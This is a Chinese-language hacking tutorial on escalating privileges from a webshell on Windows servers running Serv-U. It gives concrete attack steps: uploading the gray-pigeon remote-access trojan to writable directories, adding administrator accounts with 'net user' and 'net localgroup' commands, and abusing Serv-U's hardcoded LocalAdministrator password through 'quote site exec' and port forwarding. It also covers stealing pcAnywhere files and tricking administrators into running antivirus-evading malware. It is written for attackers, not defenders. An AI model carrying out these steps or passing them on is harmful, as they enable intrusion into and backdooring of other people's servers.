# 011
提权：

webshell 提权方法 服务器提权教程

一：首先检测一下网站的服务器是否开了 3389 
远程终端 
二：检测一下服务是否用了serv-u （还有是什么版本的） 
方法 
一：复制一个网站 用 3389 登陆器连接一下 （是否成功） 
能连接了，拿下服务器的机率，提高 30%了 
二：用ftp模式查下一个服务器的版本 
开始 -- 运行 -- cmd -- ftp (加你要登陆的网站) 
--------------------------------------------------------------------------------------- 
第一步：最简单的方法 
看有没有权限，能不能执行命令，行的话直接传个鸽子运行（成功率非常低） 
---------------------------------------------------------------------------------------- 
第二步：:寻找有执行的权限目录 
c:\winnt\system32\inetsrv\data\ 
c:\Documents and Settings\All Users\ 
c:\Program Files\serv-u\ 
C:\Program Files\Microsoft SQL Server\ 
这样的目录可以直接上传鸽子，运行 
----------------------------------------------------------------------------------- 
第三步：传个cmd和开帐号的ftp.exe上去直接加帐号 
命令就是你上传目录D:\VMware Workstation\cmd.exe "net user xiao xiao 
/add" 
----------------------------------------------------------------------------------- 
第四步：asp提权木马直接提权 
serv-u 6.3 版本 好象用asp提权木马（不成功） 
serv-u 6.2 版本 好象可以 
不过提权能不能用asp木马还要看服务器，设置的变态不 
假设直接用asp提权成功之后，还是不成功，但是可以在 
cmd之下 用这个帐号连接一下 
ftp (加你提权的网站) 
帐号：LocalAdministrator 密码：$ak#.1k;0@p">#1@$ak#.1k;0@p 
如果成功连接后就可以直接添加管理员帐号了 
命令：quote site exec (你添加的帐号) net user 123 123 /ad 
quote site exec （把帐号提升到最高权限） net localgroup administartors 
123 /add 
--------------------------------------------------------------------------------------- 
第五步：pcaanywhere 
C:\Documents and Settings\All Users\Application 
Data\Symantec\pcAnywhere\ 
这里下他的GIF文件，在本地安装pcanywhere上去 
网上很多教程 
--------------------------------------------------------------------------------------- 
第六步：serv-u覆盖提权 
本地安装个su，将你自己的ServUDaemon.ini文件用从他那下载下来的ServUDaemon.ini 
网上很多教程 
---------------------------------------------------------------------------------------- 
第七步：Serv-U转发端口 
给Latte加盐 曾经做个一个（serv-u经典提权全套教程）用到过这个方法，可以学习一下 
上传个端口转发工具 
命令：（工具名）–v –l 3333 –r 43958 127.0.0.1 
意思是将3333端口映射到43958端口上。 然后就可以在本地安装一个Serv-u，新建一个服务器， 
IP填对方IP，帐号为LocalAdministrator 
密码为$ak#.1k;0@p">#1@$ak#.1k;0@p， 
连接上后你就可以管理他的Serv-u了 
-------------------------------------------------------------------------------------------- 
第八步：社会工程学之提升提权 
把灰鸽子传到上面，然后转移到c盘，就等着管理员运行了，前提你的鸽子必须免杀 
要是让我看到一个不清楚的exe程序，老想点开看看，呵呵(估计没有那个SB会点吧)
